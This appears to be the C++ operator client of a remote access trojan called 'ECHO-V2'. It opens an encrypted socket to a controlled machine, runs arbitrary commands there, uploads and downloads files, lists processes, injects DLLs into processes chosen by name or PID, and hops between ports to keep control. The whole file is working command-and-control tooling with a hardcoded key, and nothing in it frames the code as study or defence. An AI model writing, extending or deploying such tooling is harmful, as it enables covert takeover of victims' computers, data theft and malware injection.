#include <iostream>
#include <fstream>
#include <string>
#include <cstring>
#include <winsock2.h>
#include <windows.h>
#include <thread>
#include "lib/crypto.h"

#define BUFFER_SIZE 51192
#define FILE_BUFFER 8192
#define SOCKET_TIMEOUT_MS 120000

#pragma comment(lib, "ws2_32.lib")

void setColor(int color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
}

const unsigned char SECRET_KEY[] = "MyUltraSecureKey2024!@#$%Remote";
const int KEY_LEN = sizeof(SECRET_KEY) - 1;

Crypto crypto(SECRET_KEY, KEY_LEN);
SOCKET sock = INVALID_SOCKET;
int current_port = 0;

bool send_all(const char* data, int len, int timeout_ms = SOCKET_TIMEOUT_MS) {
    if (len <= 0 || sock == INVALID_SOCKET) return true;
    
    int total_sent = 0;
    int bytes_left = len;
    
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));
    
    while (total_sent < len) {
        int bytes_sent = send(sock, data + total_sent, bytes_left, 0);
        if (bytes_sent == SOCKET_ERROR) {
            int error = WSAGetLastError();
            if (error == WSAEWOULDBLOCK || error == WSAETIMEDOUT) {
                continue;
            }
            return false;
        }
        if (bytes_sent == 0) return false;
        total_sent += bytes_sent;
        bytes_left -= bytes_sent;
    }
    return true;
}

int recv_all(char* buffer, int len, int timeout_ms = SOCKET_TIMEOUT_MS) {
    if (len <= 0 || sock == INVALID_SOCKET) return 0;
    
    int total_received = 0;
    int bytes_left = len;
    
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));
    
    while (total_received < len) {
        int bytes_recv = recv(sock, buffer + total_received, bytes_left, 0);
        if (bytes_recv == SOCKET_ERROR) {
            int error = WSAGetLastError();
            if (error == WSAEWOULDBLOCK || error == WSAETIMEDOUT) {
                continue;
            }
            return -1;
        }
        if (bytes_recv == 0) return -1;
        total_received += bytes_recv;
        bytes_left -= bytes_recv;
    }
    return total_received;
}

void send_encrypted(const char* data, int len) {
    if (len == 0 || sock == INVALID_SOCKET) return;
    
    unsigned char* encrypted = new unsigned char[len + 1];
    memcpy(encrypted, data, len);
    crypto.encrypt(encrypted, len);
    
    if (!send_all((char*)&len, sizeof(int))) {
        delete[] encrypted;
        return;
    }
    
    int total_sent = 0;
    int chunk_size = 8192;
    
    while (total_sent < len) {
        int current_chunk = (len - total_sent) < chunk_size ? (len - total_sent) : chunk_size;
        if (!send_all((char*)encrypted + total_sent, current_chunk)) {
            break;
        }
        total_sent += current_chunk;
        Sleep(1);
    }
    
    delete[] encrypted;
}

int recv_encrypted(char* output, int max_size = 100 * 1024 * 1024) {
    if (sock == INVALID_SOCKET) return -1;
    
    int len = 0;
    if (recv_all((char*)&len, sizeof(int)) != sizeof(int)) {
        return -1;
    }
    
    if (len <= 0 || len > max_size) return -1;
    
    unsigned char* encrypted = new unsigned char[len];
    int total_received = 0;
    int chunk_size = 8192;
    
    while (total_received < len) {
        int current_chunk = (len - total_received) < chunk_size ? (len - total_received) : chunk_size;
        int bytes = recv_all((char*)encrypted + total_received, current_chunk);
        if (bytes != current_chunk) {
            delete[] encrypted;
            return -1;
        }
        total_received += bytes;
    }
    
    crypto.decrypt(encrypted, len);
    memcpy(output, encrypted, len);
    delete[] encrypted;
    
    return len;
}

void receive_and_display_large_output() {
    char* buffer = new char[100 * 1024 * 1024]; 
    int bytes = recv_encrypted(buffer, 100 * 1024 * 1024);
    
    if (bytes > 0) {
        int display_chunk = 4096;
        int offset = 0;
        while (offset < bytes) {
            int chunk = (bytes - offset) < display_chunk ? (bytes - offset) : display_chunk;
            std::cout.write(buffer + offset, chunk);
            offset += chunk;
            if (chunk == display_chunk && offset < bytes) {
                Sleep(1);
            }
        }
    } else if (bytes == -1) {
        setColor(12);
        std::cout << "\n[ERROR] Connection lost while receiving data!" << std::endl;
        setColor(7);
        delete[] buffer;
        exit(1);
    }
    
    delete[] buffer;
}

void execute_remote_command(const std::string& cmd) {
    send_encrypted(cmd.c_str(), cmd.size());
    receive_and_display_large_output();
}

void print_banner() {
    setColor(11);
    std::cout << "\n";
    std::cout << "+================================================================+\n";
    setColor(10);
    std::cout << "|         ECHO-V2 Encrypted ChaCha20 Hopping Operator           |\n";
    setColor(14);
    std::cout << "|                    Secure Tunnel Active                       |\n";
    setColor(13);
    std::cout << "|              [  github: github.com/batmanpriv  ]              |\n";
    setColor(11);
    std::cout << "+================================================================+\n";
    setColor(7);
    std::cout << "\n";
}

void show_help() {
    setColor(11);
    std::cout << "\n+========================== COMMANDS ==========================+\n";
    setColor(10);
    std::cout << "| [BASIC]                                                       |\n";
    std::cout << "|   help, exit, clear, pwd                                      |\n";
    std::cout << "|   cd <dir>, upload <file>, download <file>                    |\n";
    setColor(14);
    std::cout << "| [PROCESS]                                                     |\n";
    std::cout << "|   ps                       - List all processes with PID      |\n";
    std::cout << "|   me                       - Show current process info        |\n";
    std::cout << "|   inject <PID or name>     - Inject DLL into process          |\n";
    setColor(13);
    std::cout << "| [NETWORK]                                                     |\n";
    std::cout << "|   hop <port>               - Change server port dynamically   |\n";
    setColor(12);
    std::cout << "| [SYSTEM]                                                      |\n";
    std::cout << "|   <any command>            - Execute on remote system         |\n";
    setColor(11);
    std::cout << "+================================================================+\n";
    setColor(7);
    std::cout << "\n";
}

bool connect_to_server(const std::string& ip, int port) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return false;
    }
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return false;

    int buffer_size = 256 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, (char*)&buffer_size, sizeof(buffer_size));
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, (char*)&buffer_size, sizeof(buffer_size));
    
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    serv_addr.sin_addr.s_addr = inet_addr(ip.c_str());
    
    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == SOCKET_ERROR) {
        return false;
    }
    
    current_port = port;
    return true;
}

void upload_file(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary);
    if (!file) {
        setColor(12);
        std::cout << "\n[ERROR] File not found: " << filename << std::endl;
        setColor(7);
        return;
    }
    
    file.seekg(0, std::ios::end);
    long file_size = file.tellg();
    file.seekg(0, std::ios::beg);
    
    std::string cmd = "UPLOAD:" + filename;
    send_encrypted(cmd.c_str(), cmd.size());
    
    char response[20];
    memset(response, 0, 20);
    int bytes = recv_encrypted(response, 20);
    if (bytes <= 0) {
        setColor(12);
        std::cout << "\n[ERROR] No response from server" << std::endl;
        setColor(7);
        return;
    }
    
    if (strcmp(response, "READY") != 0) {
        setColor(12);
        std::cout << "\n[ERROR] Upload failed: " << response << std::endl;
        setColor(7);
        return;
    }
    
    setColor(10);
    std::cout << "\n[UPLOAD] " << filename << " (" << file_size << " bytes)" << std::endl;
    setColor(14);
    
    char buffer[FILE_BUFFER];
    long total_sent = 0;
    while (file.read(buffer, FILE_BUFFER) || file.gcount() > 0) {
        send_encrypted(buffer, file.gcount());
        total_sent += file.gcount();
        
        int percent = (total_sent * 100) / file_size;
        int bar_width = 40;
        int filled = (percent * bar_width) / 100;
        std::cout << "\r[";
        for (int i = 0; i < filled; i++) std::cout << "=";
        for (int i = filled; i < bar_width; i++) std::cout << " ";
        std::cout << "] " << percent << "%" << std::flush;
    }
    
    send_encrypted("EOF", 3);
    
    memset(response, 0, 20);
    recv_encrypted(response, 20);
    
    if (strcmp(response, "UPLOAD_SUCCESS") == 0) {
        setColor(10);
        std::cout << "\n[SUCCESS] File uploaded!" << std::endl;
    } else {
        setColor(12);
        std::cout << "\n[ERROR] Upload failed" << std::endl;
    }
    setColor(7);
    file.close();
}

void download_file(const std::string& filename) {
    std::string cmd = "DOWNLOAD:" + filename;
    send_encrypted(cmd.c_str(), cmd.size());
    
    char size_str[50];
    memset(size_str, 0, 50);
    recv_encrypted(size_str, 50);
    
    if (strcmp(size_str, "ERROR: File not found") == 0) {
        setColor(12);
        std::cout << "\n[ERROR] File not found" << std::endl;
        setColor(7);
        return;
    }
    
    long file_size = atol(size_str);
    send_encrypted("READY", 5);
    
    std::ofstream file(filename, std::ios::binary);
    if (!file) {
        setColor(12);
        std::cout << "\n[ERROR] Cannot create file" << std::endl;
        setColor(7);
        return;
    }
    
    setColor(10);
    std::cout << "\n[DOWNLOAD] " << filename << " (" << file_size << " bytes)" << std::endl;
    setColor(14);
    
    char buffer[FILE_BUFFER];
    long total_received = 0;
    
    while (total_received < file_size) {
        memset(buffer, 0, FILE_BUFFER);
        int bytes = recv_encrypted(buffer, FILE_BUFFER);
        if (bytes <= 0) break;
        
        if (strncmp(buffer, "EOF", 3) == 0 && bytes == 3) break;
        
        file.write(buffer, bytes);
        total_received += bytes;
        
        int percent = (total_received * 100) / file_size;
        int bar_width = 40;
        int filled = (percent * bar_width) / 100;
        std::cout << "\r[";
        for (int i = 0; i < filled; i++) std::cout << "=";
        for (int i = filled; i < bar_width; i++) std::cout << " ";
        std::cout << "] " << percent << "%" << std::flush;
    }
    
    file.close();
    setColor(10);
    std::cout << "\n[SUCCESS] File downloaded!" << std::endl;
    setColor(7);
}

void hop_with_retry(const std::string& port_str) {
    int new_port = std::stoi(port_str);
    
    setColor(14);
    std::cout << "\n[HOP] Changing port to " << new_port << "..." << std::endl;
    setColor(7);
    
    std::string cmd = "hop " + port_str;
    send_encrypted(cmd.c_str(), cmd.size());

    char ready_buffer[20];
    memset(ready_buffer, 0, 20);
    int bytes = recv_encrypted(ready_buffer, 20);
    
    if (bytes > 0 && strcmp(ready_buffer, "HOP_READY") == 0) {
        send_encrypted("ACK", 3);

        memset(ready_buffer, 0, 20);
        bytes = recv_encrypted(ready_buffer, 20);
        if (bytes > 0) {
            std::cout.write(ready_buffer, bytes);
        }
    }
    
    Sleep(1500);

    setColor(14);
    std::cout << "[HOP] Reconnecting to new port..." << std::endl;
    setColor(7);
    
    closesocket(sock);
    Sleep(1000);
    
    bool reconnected = false;
    for (int attempt = 1; attempt <= 5; attempt++) {
        setColor(14);
        std::cout << "\r[HOP] Attempt " << attempt << "/5" << std::flush;
        setColor(7);
        
        if (connect_to_server("127.0.0.1", new_port)) {
            reconnected = true;
            current_port = new_port;
            break;
        }
        Sleep(1000);
    }
    
    std::cout << std::endl;
    
    if (reconnected) {
        crypto.~Crypto();  
        new (&crypto) Crypto(SECRET_KEY, KEY_LEN);  
        
        setColor(10);
        std::cout << "\n[SUCCESS] Port changed to " << new_port << std::endl;
        setColor(7);
    } else {
        setColor(12);
        std::cout << "\n[ERROR] Failed to reconnect on port " << new_port << std::endl;
        setColor(7);
    }
}


void run() {
    print_banner();
    show_help();
    
    std::string input;
    while (true) {
        setColor(10);
        std::cout << "\n[" << current_port << "] ";
        setColor(14);
        std::cout << "$> ";
        setColor(7);
        std::getline(std::cin, input);
        
        if (input.empty()) continue;
        
        if (input == "exit" || input == "quit") {
            setColor(12);
            std::cout << "\n[!] Disconnecting..." << std::endl;
            setColor(7);
            break;
        }
        else if (input == "help") {
            show_help();
        }
        else if (input == "clear") {
            system("cls");
            print_banner();
            show_help();
        }
        else if (input == "pwd") {
            execute_remote_command("pwd");
        }
        else if (input == "me") {
            execute_remote_command("me");
        }
        else if (input == "ps") {
            execute_remote_command("ps");
        }
        else if (input.rfind("upload ", 0) == 0) {
            std::string filename = input.substr(7);
            upload_file(filename);
        }
        else if (input.rfind("download ", 0) == 0) {
            std::string filename = input.substr(9);
            download_file(filename);
        }
        else if (input.rfind("inject ", 0) == 0) {
            execute_remote_command(input);
        }
        else if (input.rfind("hop ", 0) == 0) {
            std::string port_str = input.substr(4);
            hop_with_retry(port_str);
        }
        else {
            execute_remote_command(input);
        }
    }
}

int main() {
    std::string server_ip;
    int port;
    
    system("cls");
    
    setColor(11);
    std::cout << "+================================================================+\n";
    std::cout << "|                      CONNECTION SETUP                          |\n";
    std::cout << "+================================================================+\n";
    setColor(7);
    
    std::cout << "\n";
    setColor(10);
    std::cout << "  Server IP:  ";
    setColor(14);
    std::cin >> server_ip;
    setColor(10);
    std::cout << "  Server Port: ";
    setColor(14);
    std::cin >> port;
    setColor(7);
    std::cin.ignore();
    
    if (connect_to_server(server_ip, port)) {
        setColor(10);
        std::cout << "\n[SUCCESS] Connected to " << server_ip << ":" << port << std::endl;
        setColor(14);
        std::cout << "[LOCK] ChaCha20 encryption active\n";
        std::cout << "[STABLE] Large directory support (50MB+)\n";
        std::cout << "[READY] Type 'help' for commands\n";
        setColor(7);
        run();
    } else {
        setColor(12);
        std::cout << "\n[ERROR] Connection failed!\n";
        setColor(7);
    }
    
    closesocket(sock);
    WSACleanup();
    return 0;
}
